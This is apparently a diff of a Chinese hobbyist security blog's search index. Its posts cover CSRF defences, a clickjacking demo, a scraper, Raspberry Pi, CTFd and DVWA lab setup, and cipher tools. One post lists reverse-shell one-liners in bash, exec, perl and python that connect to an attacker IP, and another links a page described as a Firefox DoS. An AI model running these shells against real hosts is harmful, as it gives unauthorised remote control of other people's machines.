中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。 这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。对于 GET 请求，token 将附在请求地址之后，这样 URL 就变成 <a href="http://url?csrftoken=tokenvalue。" target="_blank" rel="noopener">http://url?csrftoken=tokenvalue。</a> 而对于 POST 请求来说，要在 form 的最后加上 <input type="hidden" name="csrftoken" value="tokenvalue"/>，这样就把 token 以参数的形式加入请求了。 <strong>（3）在 HTTP 头中自定义属性并验证</strong> 这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。 然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网站安全 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>一个点击劫持的demo</title>
+      <link href="/2018/04/27/e4-b8-80-e4-b8-aa-e7-82-b9-e5-87-bb-e5-8a-ab-e6-8c-81-e7-9a-84demo/"/>
+      <url>/2018/04/27/e4-b8-80-e4-b8-aa-e7-82-b9-e5-87-bb-e5-8a-ab-e6-8c-81-e7-9a-84demo/</url>
+      
+        <content type="html"><![CDATA[<a id="more"></a><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;style&gt;#father{position:relative;}#dj{position:absolute;top:0px;left:10px;height:100%;width:100%;z-index:10;left:0px;}#imgdiv{text-align:center;z-index:0;}&lt;/style&gt;&lt;script&gt;function fun(){window.open(&quot;https://www.baidu.com&quot;);}&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;father&quot;&gt;&lt;div id=&quot;imgdiv&quot;&gt;&lt;img src=&quot;./timg.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;div id=&quot;dj&quot; onclick=&quot;fun()&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> html </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>简单的爬虫0x01：实现爬i春秋&quot;知识体系&quot;课程名称</title>
+      <link href="/2018/04/15/e7-ae-80-e5-8d-95-e7-9a-84-e7-88-ac-e8-99-ab0x01-ef-bc-9a-e5-ae-9e-e7-8e-b0-e7-88-aci-e6-98-a5-e7-a7-8b-e7-9f-a5-e8-af-86-e4-bd-93-e7-b3-bb-e8-af-be-e7-a8-8b-e5-90-8d-e7-a7-b0/"/>
+      <url>/2018/04/15/e7-ae-80-e5-8d-95-e7-9a-84-e7-88-ac-e8-99-ab0x01-ef-bc-9a-e5-ae-9e-e7-8e-b0-e7-88-aci-e6-98-a5-e7-a7-8b-e7-9f-a5-e8-af-86-e4-bd-93-e7-b3-bb-e8-af-be-e7-a8-8b-e5-90-8d-e7-a7-b0/</url>
+      
+        <content type="html"><![CDATA[<p>以下为全部代码实现，python版本为3.6.4</p><pre><code>#! coding=utf-8import requestsimport jsonimport urllibdef lesson(i):    url= &apos;https://www.ichunqiu.com/courses/ajaxCourses&apos;    header={            &apos;Host&apos;: &apos;www.ichunqiu.com&apos;,            &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:58.0) Gecko/20100101 Firefox/58.0&apos;,            &apos;Accept&apos;: &apos;application/json, text/javascript, */*; q=0.01&apos;,            &apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&apos;,            &apos;Accept-Encoding&apos;: &apos;gzip, deflate&apos;,            &apos;Referer&apos;: &apos;https://www.ichunqiu.com/courses&apos;,            &apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded; charset=UTF-8&apos;,            &apos;X-Requested-With&apos;: &apos;XMLHttpRequest&apos;,            &apos;Content-Length&apos;: &apos;102&apos;,            &apos;Connection&apos;: &apos;close&apos;,    }    data_post={&apos;courseTag&apos;:&apos;&apos;,&apos;courseDiffcuty&apos;:&apos;&apos;,&apos;IsExp&apos;:&apos;&apos;,&apos;producerId&apos;:&apos;&apos;,&apos;orderField&apos;:&apos;&apos;,&apos;orderDirection&apos;:&apos;&apos;,&apos;pageIndex&apos;:i,&apos;tagType&apos;:&apos;&apos;,&apos;isOpen&apos;:&apos;&apos;}    r=requests.post(url=url,headers=header,data=data_post)    data=json.loads(r.text)    #print(r.text)    #code = r.status_code    #print(code)    for name in data[&apos;course&apos;][&apos;result&apos;]:        print (name[&apos;courseName&apos;])for i in range(1,19):    lesson(i)</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> python程序设计 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Firefox低版本(慎点)</title>
+      <link href="/2018/02/16/firefox-e4-bd-8e-e7-89-88-e6-9c-ac-ef-bc-88/"/>
+      <url>/2018/02/16/firefox-e4-bd-8e-e7-89-88-e6-9c-ac-ef-bc-88/</url>
+      
+        <content type="html"><![CDATA[<p><a href="http://112.74.49.123/Firefox-DOS.html" target="_blank" rel="noopener">点击此链接（慎重！！！）</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 杂项 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>基于python的wechat跳一跳小游戏自动化得分</title>
+      <link href="/2018/01/08/e5-9f-ba-e4-ba-8epython-e7-9a-84wechat-e8-b7-b3-e4-b8-80-e8-b7-b3-e5-b0-8f-e6-b8-b8-e6-88-8f-e8-87-aa-e5-8a-a8-e5-8c-96-e5-be-97-e5-88-86/"/>
+      <url>/2018/01/08/e5-9f-ba-e4-ba-8epython-e7-9a-84wechat-e8-b7-b3-e4-b8-80-e8-b7-b3-e5-b0-8f-e6-b8-b8-e6-88-8f-e8-87-aa-e5-8a-a8-e5-8c-96-e5-be-97-e5-88-86/</url>
+      
+        <content type="html"><![CDATA[<p>前言： 近日，微信上推出了一款小程序，名为跳一跳，是通过按压屏幕时间长短控制跳跃力度，通过近一段时间对python的学习，我认为这款小游戏可以通过python取屏幕坐标值的方法进行自动化得分。 设计思路： 核心：每次落稳之后截图，根据截图算出棋子的坐标和下一个块顶面的中点坐标， 根据两个点的距离乘以一个时间系数获得长按的时间 识别棋子：靠棋子的颜色来识别位置，通过截图发现最下面一行大概是一条 直线，就从上往下一行一行遍历，比较颜色（颜色用了一个区间来比较） 找到最下面的那一行的所有点，然后求个中点，求好之后再让 Y 轴坐标 减小棋子底盘的一半高度从而得到中心点的坐标 识别棋盘：靠底色和方块的色差来做，从分数之下的位置开始，一行一行扫描， 由于圆形的块最顶上是一条线，方形的上面大概是一个点，所以就 用类似识别棋子的做法多识别了几个点求中点，这时候得到了块中点的 X 轴坐标，这时候假设现在棋子在当前块的中心，根据一个通过截图获取的 固定的角度来推出中点的 Y 坐标 最后：根据两点的坐标算距离乘以系数来获取长按时间（似乎可以直接用 X 轴距离） <a href="http://112.74.49.123/wp-content/uploads/2017/2018-1-8.mp4" target="_blank" rel="noopener">自动化功能实现录实</a> <a href="http://112.74.49.123/wp-content/uploads/2017/config.py" target="_blank" rel="noopener">用于获取手机分辨率</a> <a href="http://112.74.49.123/wp-content/uploads/2017/wechat_jump_auto.py" target="_blank" rel="noopener">自动化脚本</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> python程序设计 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>反弹shell命令</title>
+      <link href="/2017/12/12/e5-8f-8d-e5-bc-b9shell-e5-91-bd-e4-bb-a4/"/>
+      <url>/2017/12/12/e5-8f-8d-e5-bc-b9shell-e5-91-bd-e4-bb-a4/</url>
+      
+        <content type="html"><![CDATA[<p>1.利用exec弹</p><pre><code>exec 5&lt;&gt; /dev/tcp/攻击机ip/监听端口 0&gt;&amp;1     cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</code></pre><p>2.利用bash弹，在目标机器上执行</p><pre><code>bash -i &gt;&amp; /dev/tcp/攻击机ip/监听端口 0&gt;&amp;1</code></pre><p>3.利用perl弹</p><pre><code>perl -e &apos;use Socket;$i=&quot;攻击机ip&quot;;$p=监听端口;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&apos;</code></pre><p>4.利用python弹</p><pre><code>python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;攻击机ip&quot;,监听端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</code></pre><p>测试环境：kali，Ubuntu-server 首先在Ubuntu-server服务器上开6666端口，等待连接： <img src="http://112.74.49.123/wp-content/uploads/2017/12/fantanshell1.jpg" alt=""> 肉鸡执行命令： <img src="http://112.74.49.123/wp-content/uploads/2017/12/fantanshell2.jpg" alt=""> 攻击机ip为192.168.56.101，端口号6666 获得shell： <img src="http://112.74.49.123/wp-content/uploads/2017/12/fantanshell3.jpg" alt=""></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> linux通用 </category>
+          
+          <category> 代理 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Linux执行可执行文件提示No such file or directory的解决方法</title>
+      <link href="/2017/11/22/linux-e6-89-a7-e8-a1-8c-e5-8f-af-e6-89-a7-e8-a1-8c-e6-96-87-e4-bb-b6-e6-8f-90-e7-a4-bano-such-file-or-directory-e7-9a-84-e8-a7-a3-e5-86-b3-e6-96-b9-e6-b3-95/"/>
+      <url>/2017/11/22/linux-e6-89-a7-e8-a1-8c-e5-8f-af-e6-89-a7-e8-a1-8c-e6-96-87-e4-bb-b6-e6-8f-90-e7-a4-bano-such-file-or-directory-e7-9a-84-e8-a7-a3-e5-86-b3-e6-96-b9-e6-b3-95/</url>
+      
+        <content type="html"><![CDATA[<p>最近在划水一个ctf比赛时，做到re的一道题目，在新装的Ubuntu-server 16.04.2上运行./re0，结果出现了No such file or directory。</p><pre><code>./re0-bash: ./tshref: No such file or directory</code></pre><p>查看文件信息，可以看到文件是存在的，并且是可以执行的。</p><pre><code>-rwxrwxrwx 1 root root 9712 Nov 17 20:50 re0</code></pre><p><img src="http://112.74.49.123/wp-content/uploads/2017/11/1-1.jpg" alt=""> 经过一番google，发现可能是系统位数与该可执行文件需要的lib库位数不匹配。 用uname命令打印系统信息，可以看到系统是64位系统 <img src="http://112.74.49.123/wp-content/uploads/2017/11/11.jpg" alt=""> 用file命令查看re0这个文件的信息</p><pre><code>file ./re0</code></pre><p><img src="http://112.74.49.123/wp-content/uploads/2017/11/111.jpg" alt=""> 可以看到这是一个32位可执行文件。 要想在64位系统上与运行32位程序，则需要安装32位lib库。 于是，安装就好 <img src="http://112.74.49.123/wp-content/uploads/2017/11/1111.jpg" alt=""> 没找到google上说的需要的库，但是会有几个替代包，选择安装其中一个。 apt-get install lib32z1 <img src="http://112.74.49.123/wp-content/uploads/2017/11/qweqweqe.jpg" alt=""> 然后就可以正常运行之前的可执行文件了。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> linux通用 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>树莓派Ubuntu-mate装vnc</title>
+      <link href="/2017/11/21/e6-a0-91-e8-8e-93-e6-b4-beubuntu-mate-e8-a3-85vnc/"/>
+      <url>/2017/11/21/e6-a0-91-e8-8e-93-e6-b4-beubuntu-mate-e8-a3-85vnc/</url>
+      
+        <content type="html"><![CDATA[<p>1、sudo apt-get install tightvncserver 2、开启vnc服务 tightvncserver （tip：首次开启需要配置密码，密码位数6-8位） 3、VCN常用控制 停止VNC窗口：vncserver -kill:1 修改密码：vncpasswd 重启服务器：service vncserver restart 4、安装远程桌面服务（xrdp） sudo apt-get install xrdp 5、修改配置文件 vi ~/.vnc/xstartup 在 x-window-manager &amp; 的后面新增下面这 1 行： <strong>mate-session &amp;</strong> 配置文件修改后，需要重启VNC服务。 6、远程桌面（mstsc.exe）连接树莓派 <img src="http://112.74.49.123/wp-content/uploads/2017/11/QQ%E6%88%AA%E5%9B%BE20171121165327.jpg" alt=""> <img src="http://112.74.49.123/wp-content/uploads/2017/11/7.jpg" alt=""></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 树莓派 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>树莓派Ubuntu Mate系统中开启ssh</title>
+      <link href="/2017/11/21/e6-a0-91-e8-8e-93-e6-b4-beubuntu-mate-e7-b3-bb-e7-bb-9f-e4-b8-ad-e5-bc-80-e5-90-afssh/"/>
+      <url>/2017/11/21/e6-a0-91-e8-8e-93-e6-b4-beubuntu-mate-e7-b3-bb-e7-bb-9f-e4-b8-ad-e5-bc-80-e5-90-afssh/</url>
+      
+        <content type="html"><![CDATA[<p>树莓派安装好Ubuntu mate后，默认没有开启ssh，所以无法进行ssh登录。 成功开启的方法如下： 1、ps -e |grep ssh 如果可以看到ssh-agent，说明Ubuntu缺省安装了openssh-client，可以在树莓派ssh登录其他系统 如果可以看到sshd，说明安装了openssh-server，可以从其他系统通过ssh登录到树莓派。 2、新装的系统是看不到sshd进程的，原因在于默认是不开起该项服务的。通过以下过程开启 1）配置树莓派，sudo raspi-config命令进入树莓派设置 <img src="http://112.74.49.123/wp-content/uploads/2017/11/raspi-config.jpg" alt=""> 2）选择第3项，并回车 <img src="http://112.74.49.123/wp-content/uploads/2017/11/1.jpg" alt=""> 3）选择P2 SSH并回车 <img src="http://112.74.49.123/wp-content/uploads/2017/11/raspi-config.jpg" alt=""> 4）选择yes并回车 5）等待开启完成并回车确认 6）完成后退出配置即可，现在ps -e|grep ssh应该可以看到sshd了 <img src="http://112.74.49.123/wp-content/uploads/2017/11/mate-ssh.jpg" alt=""></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 树莓派 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>CTFd搭建</title>
+      <link href="/2017/11/19/ctfd-e6-90-ad-e5-bb-ba/"/>
+      <url>/2017/11/19/ctfd-e6-90-ad-e5-bb-ba/</url>
+      
+        <content type="html"><![CDATA[<a id="more"></a><p><strong>0x00 前言</strong> 快到社团活动线下赛的时间了，搭个CTF平台用来做活动。 早就看中了CTFd这个平台，正好又要活动了，于是直接搭建。 系统: Ubuntu server 16.04 nginx: nginx/1.10.3 (Ubuntu) Mysql: 5.7.20-0ubuntu0.16.04.1 (Ubuntu) Python: 2.7.12 <strong>0x01 下载项目&amp;环境配置</strong> 下载 git clone <a href="https://github.com/isislab/CTFd.git" target="_blank" rel="noopener">https://github.com/isislab/CTFd.git</a> 在<a href="https://github.com/CTFd/CTFd下有个Install" target="_blank" rel="noopener">https://github.com/CTFd/CTFd下有个Install</a> Install: Run ./prepare.sh to install dependencies using apt. Modify CTFd/config.py to your liking. Use python serve.py in a terminal to drop into debug mode. Here are some deployment options You can check out the Getting Started guide for a breakdown of some of the features you need to get started. 环境： Nginx可以apt-get install nginx，mysql的话ubuntu server自带，python系统自带。 Ubuntu-server搭好之后apt-get update一下，然后apt-get upgrade一下，把该更新的都更新了。 <strong>0x02 安装&amp;排错</strong> 环境配置好了之后，运行CTFd-master目录下的./prepare.sh 之后CTFd/config.py文件，把HOST改成服务器ip CTFd-master目录下的server.py里边的host也改成服务器ip 这是为了方便外部访问。 然后再CTFd-master目录下python server.py 可以看到平台启动成功，running on ip：端口 现在就可以通过<a href="http://ip:port访问平台了，就酱" target="_blank" rel="noopener">http://ip:port访问平台了，就酱</a>~</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF平台搭建 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>管理树莓派SD卡分区空间（linux分区管理）</title>
+      <link href="/2017/11/19/e7-ae-a1-e7-90-86-e6-a0-91-e8-8e-93-e6-b4-besd-e5-8d-a1-e5-88-86-e5-8c-ba-e7-a9-ba-e9-97-b4-ef-bc-88linux-e5-88-86-e5-8c-ba-e7-ae-a1-e7-90-86-ef-bc-89/"/>
+      <url>/2017/11/19/e7-ae-a1-e7-90-86-e6-a0-91-e8-8e-93-e6-b4-besd-e5-8d-a1-e5-88-86-e5-8c-ba-e7-a9-ba-e9-97-b4-ef-bc-88linux-e5-88-86-e5-8c-ba-e7-ae-a1-e7-90-86-ef-bc-89/</url>
+      
+        <content type="html"><![CDATA[<p>前几天入了个树莓派3b+，一到手就各种系统：Ubuntu-server Ubuntu-mate，但是这些都不适合做安全，于是，我上了神器，kali-2017.2-rpi3-nexmon 首先下载并把镜像烧写到SD卡上。然后进树莓派，装系统。 装完之后进去发现就一个空壳啊，什么都没有，搜了一下才发现，原来还要装工具：apt-get install kali-linux-all 安装过程中报错，磁盘剩余空间不足。但我用的是32G内存卡啊，df -h一下才发现，/分区只分了两个多G。 于是，修改SD卡分区。 首先，查看一下硬盘使用情况，命令如下： df -h 然后用fdisk命令进行分区操作 (实际操作前最好先熟悉一下fdisk的用法) 命令格式： fdisk &lt;存储设备名&gt; //如: fdisk /dev/sda 进入fdisk 后，使用单键命令 m 显示Help p 列出所有分区 d 删除分区 n 新建分区 w 存盘退出 q 不存盘退出 对主设备进行fdisk，命令如下： sudo fdisk /dev/sda (如果是在物理机器上操作，命令应是 sudo fdisk /dev/mmcblk0) 按 p 键 列出所有分区，可见有两个或三个分区 第一个分区是 FAT32分区，是引导用的 第二个分区是Linux 主分区 第三个分区是Linux Swap交换文件分区(虚拟机中可能没有) 用笔记下Linux 主分区的Start Sector号 按 d 键 Partition Number (分区号) 选 2, 删除linux主分区（第2个区） 如果有linuxSwap分区，再按d键 Partition Number (分区号) 选 3, 删除linuxSwap分区（第3个区） 按 p 键 列出所有分区，可见只剩第一个分区了 按 n 键，重新创建linux主分区 Partition Type(分类类型) 选 P (Primary) Partition Number (分区号) 选 2 First Sector(起始Sector) 一定要输入刚才记下来的Start Sector号 Last Sector (终止Sector)用默认值，直接回车 按 p 键 列出所有分区，可见有两个分区，linux主分区在第2个，起始位置是原位置 按 w 键 存盘退出fdisk 接下来，立即重启，不要做任何其它事情 sudo reboot 重启并登录后，立即用以下命令 sudo resize2fs /dev/sda2 (如果是在物理机器上操作，命令应是sudo resize2fs /dev/mmcblk0p2) 该命令将把第二个分区扩展到新的空间中 查看一下硬盘使用情况，OK了 df -h 上述操作的原理是： 首先删除了linux主分区和Swap分区，重建的主分区起始Sector位置与原主分区一致，再resize2fs，则原主分区数据完全没变，但改变了主分区的大小。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> linux通用 </category>
+          
+          <category> 树莓派 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>在linux的/（根）目录下执行rm -rf *的愉快经历</title>
+      <link href="/2017/10/20/e5-9c-a8linux-e7-9a-84-ef-bc-88-e6-a0-b9-ef-bc-89-e7-9b-ae-e5-bd-95-e4-b8-8b-e6-89-a7-e8-a1-8crm-rf-e7-9a-84-e6-84-89-e5-bf-ab-e7-bb-8f-e5-8e-86/"/>
+      <url>/2017/10/20/e5-9c-a8linux-e7-9a-84-ef-bc-88-e6-a0-b9-ef-bc-89-e7-9b-ae-e5-bd-95-e4-b8-8b-e6-89-a7-e8-a1-8crm-rf-e7-9a-84-e6-84-89-e5-bf-ab-e7-bb-8f-e5-8e-86/</url>
+      
+        <content type="html"><![CDATA[<p>装了个Ubuntu server 14.04虚拟机，本来想搭fbctf，但是苦于没梯子… 看着它6个多G的大小，终于下定决心，删之 一直听说恐怖的rm -rf *大法，于是我就决定在这台肥的虚拟机上试验一下 cd到/，输入rm -rf *，回车 瞬间跳出大量不可删除的信息 <img src="http://112.74.49.123/wp-content/uploads/2017/10/rm.jpg" alt=""> 略过这难熬的一分钟 删除完之后命令行界面依然存在，但是很多基础的命令都被删了，连ls命令都不能使用，不过好在pwd和cd可用，删除之后目录结构也特别单调 附一张删除之后的gif <img src="http://112.74.49.123/wp-content/uploads/2017/10/rm.gif" alt=""> Ubuntu server os：我感觉我已经是台废服务器了</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> linux </category>
+          
+          <category> linux通用 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Centos搭建DVWA实验平台</title>
+      <link href="/2017/10/19/centos-e6-90-ad-e5-bb-badvwa-e5-ae-9e-e9-aa-8c-e5-b9-b3-e5-8f-b0/"/>
+      <url>/2017/10/19/centos-e6-90-ad-e5-bb-badvwa-e5-ae-9e-e9-aa-8c-e5-b9-b3-e5-8f-b0/</url>
+      
+        <content type="html"><![CDATA[<a id="more"></a><p>1.安装虚拟机 这个就不多说了，安装一个centos7最小模式就行 然后配置ssh yum install openssh* vi /etc/ssh/sshd_config 把下面两行取消注释 PermitEmptyPasswords no PasswordAuthentication yes 这里我们就不限制root用户登录ssh了 确保这个是 PermitRootLogin yes 就是确保我们可以用root登录ssh 重启ssh systemctl restart sshd.service 设置开机启动 systemctl enable sshd.service 添加防火墙策略 firewall-cmd –permanent –zone=public –add-service=ssh firewall-cmd –reload 2.配置网卡（不然没法上网） 首先我们进入这个配置文件目录 cd /etc/sysconfig/network-scripts 一般是在这个目录下有个叫 ifcfg-enp0s3 这样一个文件，没有的话找找其他的相似的文件 然后我们打开它 vi ifcfg-enp0s3 这个时候我们还没有vim的，所以只好用vi这个简版的 然后将 ONBOOT=no 改为 ONBOOT=yes 保存后重启网卡： service network restart 此时就可以上网了 3.各种前期准备工作（参考） 我们先更新一下cache yum makecache 升级一下 yum update 然后安装一下vim yum install vim 安装ifconfig yum install net-tools 这里生不升级看你，安不安vim也看你，没vim编辑配置文件很麻烦我感觉 4.安装必要组件 我们先安装Apache的服务器 yum install httpd 然后启动Apache service httpd start 然后看一下Apache的状态 service httpd status 然后设置httpd在运行级别为2、3、4、5的情况下都是on（开启）的状态 chkconfig –level 2345 httpd on firewall-cmd –permanent –zone=public –add-service=http 安装MySQL，mysql在centos的源中是没有的，只有mariadb，一样 你想自己官网下，然后编译安装也可以，这里我就用mysql的分之兼容产品mariadb了 [root@localhost ~]# yum search mariadb Loaded plugins: fastestmirror Loading mirror speeds from cached hostfile * base: centos.ustc.edu.cn * extras: centos.ustc.edu.cn * updates: centos.ustc.edu.cn ==================================================================================== N/S matched: mariadb ==================================================================================== mariadb-bench.x86_64 : MariaDB benchmark scripts and data mariadb-devel.i686 : Files for development of MariaDB/MySQL applications mariadb-devel.x86_64 : Files for development of MariaDB/MySQL applications mariadb-embedded.i686 : MariaDB as an embeddable library mariadb-embedded.x86_64 : MariaDB as an embeddable library mariadb-embedded-devel.i686 : Development files for MariaDB as an embeddable library mariadb-embedded-devel.x86_64 : Development files for MariaDB as an embeddable library mariadb-libs.i686 : The shared libraries required for MariaDB/MySQL clients mariadb-libs.x86_64 : The shared libraries required for MariaDB/MySQL clients mariadb-server.x86_64 : The MariaDB server and related files mariadb.x86_64 : A community developed branch of MySQL mariadb-test.x86_64 : The test suite distributed with MariaD Name and summary matches only, use “search all” for everything. [root@localhost ~]# 我们安装这几个包就可以了 yum install mariadb.x86_64 mariadb-server.x86_64 mariadb-libs.x86_64 mariadb-devel.x86_64 启动mysql service mariadb start chkconfig –level 2345 mariadb on 然后设置mariadb的初始密码 mysqladmin -u root -p password 然后就可以登录了 mysql -uroot -p 创建一个数据库 create database dvwa; quit; 然后我们安装PHP yum install php.x86_64 php-mysql.x86_64 php-pear php-pear-DB php-gd 然后我们下载DVWA的包，先安装一个wget yum install wget wget <a href="https://github.com/ethicalhack3r/DVWA/archive/v1.9.tar.gz" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA/archive/v1.9.tar.gz</a> cp v1.9.tar.gz /var/www/html/ cd /var/www/html tar zxvf v1.9.tar.gz mv DVWA-1.9 dvwa 然后我们用另一台机器的浏览器访问虚拟机的ip（这个时候确保机器网络设置为桥接，然后重启，然后再用ifconfig查看你虚拟机的ip，然后访问） <a href="http://x.x.x.x/dvwa/setup.php" target="_blank" rel="noopener">http://x.x.x.x/dvwa/setup.php</a> 然后根据红色那些提示，设置环境 一般就是这样的 vim /etc/php.ini 将这几个设置成这样的 allow_url_fopen = On allow_url_include = On 进入/var/www/html/dvwa/config目录下 先备份配置文件 cp config.inc.php config.inc.php.bak 改这么几个地方 vim config.inc.php $_DVWA[ ‘db_server’ ] = ‘localhost’; $_DVWA[ ‘db_password’ ] = ‘youmysqlpassword’; $_DVWA[ ‘recaptcha_public_key’ ] = ‘’; $_DVWA[ ‘recaptcha_private_key’ ] = ‘’; 然后下面这个赋权可写 /var/www/html/dvwa/hackable/uploads cd /var/www/html/dvwa/hackable/ chmod 777 uploads /var/www/html/dvwa/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt cd /var/www/html/dvwa/external/phpids/0.6/lib/IDS/tmp chmod 777 phpids_log.txt ok 然后我们点一下Create/Reset那个按钮 然后就会自动跳到登录界面 默认的登录密码是 admin password</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> centos </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>常见古典密码及在线工具</title>
+      <link href="/2017/10/19/e5-b8-b8-e8-a7-81-e5-8f-a4-e5-85-b8-e5-af-86-e7-a0-81-e5-8f-8a-e5-9c-a8-e7-ba-bf-e5-b7-a5-e5-85-b7/"/>
+      <url>/2017/10/19/e5-b8-b8-e8-a7-81-e5-8f-a4-e5-85-b8-e5-af-86-e7-a0-81-e5-8f-8a-e5-9c-a8-e7-ba-bf-e5-b7-a5-e5-85-b7/</url>
+      
+        <content type="html"><![CDATA[<ul><li><strong>加密解密</strong><ul><li><a href="http://jiema.wwei.cn/" target="_blank" rel="noopener">二维码解码</a></li><li><a href="http://www.wwei.cn/" target="_blank" rel="noopener">二维码编码</a></li><li><a href="http://www1.tc711.com/tool/BASE64.htm" target="_blank" rel="noopener">Base64编码/解码</a></li><li><a href="http://pbaseconverter.com/" target="_blank" rel="noopener">Base32/Base16</a></li><li><a href="http://tool.oschina.net/encode?type=4" target="_blank" rel="noopener">URL解码</a></li><li><a href="http://www.cmd5.com/" target="_blank" rel="noopener">MD5查询</a></li><li><a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx" target="_blank" rel="noopener">摩尔斯电码</a></li><li><a href="http://www.5ixuexiwang.com/str/" target="_blank" rel="noopener">字符串处理</a></li><li><a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">与佛论禅</a></li><li><a href="http://www.qqxiuzi.cn/bianma/wenbenjiami.php" target="_blank" rel="noopener">将文本加密为各种语言</a></li><li><a href="http://web.chacuo.net/charsetuuencode" target="_blank" rel="noopener">UU编码</a>(邮件编码的一种)</li><li><a href="http://dogmamix.com/MimeHeadersDecoder/" target="_blank" rel="noopener">MIME标准</a>(邮件编码的一种)</li><li><a href="http://encoders-decoders.online-domain-tools.com/" target="_blank" rel="noopener">Binhex编码</a>(邮件编码的一种,常见于MAC机)</li><li><a href="http://tomeko.net/online_tools" target="_blank" rel="noopener">在线工具集合</a></li><li><a href="http://www.practicalcryptography.com/ciphers/classical-era/rail-fence/" target="_blank" rel="noopener">栅栏密码</a></li><li><a href="http://serpent.online-domain-tools.com/" target="_blank" rel="noopener">serpent加密解密</a></li><li><a href="http://planetcalc.com/1434/" target="_blank" rel="noopener">凯撒密码</a></li><li><a href="http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php" target="_blank" rel="noopener">ROT5/13/18/47</a></li><li><a href="https://tool.lu/js/" target="_blank" rel="noopener">js代码在线加密解密</a></li><li><a href="http://quipqiup.com/index.php" target="_blank" rel="noopener">词频在线分析</a></li></ul></li><li><strong>图像分析</strong><ul><li><a href="http://www.360doc.com/content/13/0314/18/699582_271506280.shtml" target="_blank" rel="noopener">GIF逐帧分解</a></li></ul></li></ul><blockquote><p>本地工具</p></blockquote><ul><li><strong>信隐术</strong><ul><li><a href="https://pan.baidu.com/s/1jIdMWIi" target="_blank" rel="noopener">Stegsolve</a> (图像通道分析工具)</li><li><a href="http://pan.baidu.com/s/1i54jWOl" target="_blank" 